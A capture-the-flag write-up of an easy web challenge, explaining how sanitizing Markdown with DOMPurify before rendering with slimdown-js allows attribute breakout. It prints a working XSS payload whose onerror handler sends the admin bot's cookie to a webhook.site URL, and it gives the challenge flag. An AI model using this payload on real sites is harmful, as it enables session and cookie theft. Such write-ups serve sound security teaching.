
---

# Writeup: Notey (Web)

**Difficulty:** Easy

**Category:** Web / XSS (Mutation-based)

## 1. Challenge Overview

The application is a Markdown-based note-taking app. The goal was to exploit a Cross-Site Scripting (XSS) vulnerability to steal a cookie from an admin bot that visits reported notes.

## 2. Vulnerability Analysis

The vulnerability was found in the rendering logic within `src/app/notes/[id]/page.js`:

JavaScript

```
const cleanMarkdown = DOMPurify.sanitize(markdown);
const html = render(cleanMarkdown);
```

### The Flaw:

The developer performed **Sanitization BEFORE Rendering**.

- **DOMPurify** was used on the raw Markdown text. Since Markdown syntax like `![x](...)` is just plain text and not HTML, DOMPurify ignored it.
    
- **slimdown-js** (the renderer) then took that "clean" text and converted it into HTML tags.
    
- Because the renderer used regex to build the tags, it was possible to "break out" of the generated HTML attributes.
    

## 3. Exploitation Steps

### Step 1: Crafting the Payload

We needed a Markdown string that looked like a standard image but included an extra attribute.

**Payload:** `![x](x"onerror="location='https://webhook.site/YOUR-ID?c='+document.cookie)`

When rendered by `slimdown-js`, this became:

`<img src="x" onerror="location='https://webhook.site/...' ..." />`

### Step 2: Delivery

1. Created a note with the payload.
    
2. Reported the note ID to the admin bot via the `/report` endpoint.
    

### Step 3: Capture

The admin bot visited the note, the `onerror` event triggered (because `src="x"` is an invalid image), and the bot's cookies were sent to the webhook.

---

**Final Flag:** `VBD{m4rkd0wn_1s_n0t_s3cur3_f031aa747dafeb8c6d39b8b6caf4a72b}`

`=======================================================================`
